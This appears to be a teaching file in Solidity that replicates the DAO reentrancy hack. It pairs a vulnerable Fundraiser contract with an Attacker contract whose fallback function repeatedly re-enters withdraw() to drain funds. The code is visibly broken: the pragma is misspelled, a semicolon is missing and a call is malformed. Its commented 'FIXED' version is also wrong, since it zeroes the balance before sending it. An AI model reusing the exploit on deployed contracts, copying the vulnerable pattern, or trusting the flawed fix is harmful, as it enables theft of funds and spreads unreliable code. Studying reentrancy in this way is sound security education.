//DAO Hack - Replicating the Vulnerability
//Re-Entrace Attack

//Fundraiser.sol
pragma solidty ^0.4.8;

contract Fundraiser{
  mapping(address => uint) balances;

  function contribute() payable {
    balances[msg.sender] += msg.value;
  }

  function withdraw() {
    if(balances[msg.sender] == 0) {
      throw;
    }
    if(msg.sender.call.value(balances[msg.sender]())) {
      balances[msg.sender] = 0;
    }
    //FIXED first balance then call
    // balances[msg.sender] = 0;
    // msg.sender.call.value(balances[msg.sender])();
  }
}

//Attacker.sol
pragma solidty ^0.4.8;
import "./Fundraiser.sol"

contract Attacker{

  address public fundraiserAddress;
  uint public drainTimes = 0;

  function Attacker(address victimAddress){
    fundraiserAddress = victimAddress;
  }

  //fallback function whenever funds
  //where Pushed to this contract from outisde
  function() payable{
    if(drainTimes<3){
      drainTimes++;
      Fundraiser(fundraiserAddress).withdraw();
    }
  }

  function getFunds() returns (uint){
    return address(this).balance;
  }

  //step1 -> init pay to be able
  //to pass a balances[msg.sender] == 0 in Fundraiser
  //and withdraw
  function initPay() payable{
    Fundraiser(fundraiserAddress).contribute.value(msg.value)();
  }

  //step2
  function startScam(){
    Fundraiser(fundraiserAddress).withdraw();
  }
}
